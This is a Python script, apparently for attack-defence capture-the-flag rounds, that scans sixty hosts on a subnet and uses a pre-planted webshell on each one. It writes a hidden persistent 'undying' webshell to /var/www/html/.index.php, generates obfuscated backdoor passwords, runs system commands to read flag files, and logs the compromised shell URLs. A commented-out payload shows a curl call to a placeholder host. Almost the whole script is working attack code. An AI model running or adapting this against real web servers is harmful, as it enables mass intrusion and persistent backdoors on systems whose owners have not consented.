#coding=utf-8
import requests
import re


webshelllist=open("webshelllist.txt","w")
flag=open("firstround_flag.txt","w")
nodieshelllist=open("nodieshelllist.txt","w")
nodieshell4 = open('nodieshell4replace.php','r')
nodieshell4replace = nodieshell4.read()

def generate_shell(s):	#s为密码 生成制定密码的后门 返回新后门的代码
	tmp = ''
	# print s
	for i in s:
		tmp += "$_uU(%s)." % (str(ord(i)))
	return nodieshell4replace.replace('REPLACEME',tmp)

# print generate_shell('abdf')

flag_pattern = re.compile('flag\{.*\}')	# 匹配flag的正则
url_head="http://xxx.xx.xxx."	#网段  自己修改这部分 有可能是在 1.1.x.1
url=""
shell_addr="/Upload/index.php"	#预留木马地址 可以看自己服务器状况
#shell_addr = '/.config.php'	#自己写入的
passwd="xxxxx"					#木马密码 如eval($_POST[123])  密码就是123
port="80"
nodieshell = open('./nodieshell.php','r').read()
payload =  {passwd: 'system(\'cat /flag\');'}	# 用后门拿flag 
#payload =  {passwd: 'system(\'curl xxxxxxxxxxxx\');'}
payload2 = {passwd: 'file_put_contents(\'/var/www/html/.index.php\',\''+nodieshell+'\');'}	# 密码为 1


for i in range(1,61):
	url=url_head+str(i)+":"+port+shell_addr
	shell_pass = '1'	# 默认为 1
	payload3 = {passwd: 'file_put_contents(\'/var/www/html/.index.php\',\''+generate_shell(shell_pass)+'\');'}
	# payload3 指定后门密码
	try:	
		rr = requests.post(url,payload2,timeout=2)	# 写入不死马到 /var/www/html/.index/php
		print rr.staus_code
		shell_url = url_head+str(i)+":"+port+'/.index.php'
		print shell_url
		rrr = requests.get(url=shell_url,timeout=1)
		print rrr.staus_code # 激活不死马 密码为 1 路径看nodieshell.php
		print >>webshelllist,shell_url+","+shell_pass
	except:
		print url+" connect shell fail"
	try:
		res=requests.post(url,payload,timeout=1)
		if res.status_code == requests.codes.ok:
			result = url+" connect shell sucess,flag is "+res.text
			print result
			#dat = flag_pattern.findall(result)
			#if dat:
			#	result = dat[0]
			#	print result
			print >>flag,result
			print >>webshelllist,url+","+passwd
		else:
			print "shell 404"
	except:
		print url+" connect shell fail"

webshelllist.close()
flag.close()
nodieshelllist.close()
nodieshell4.close()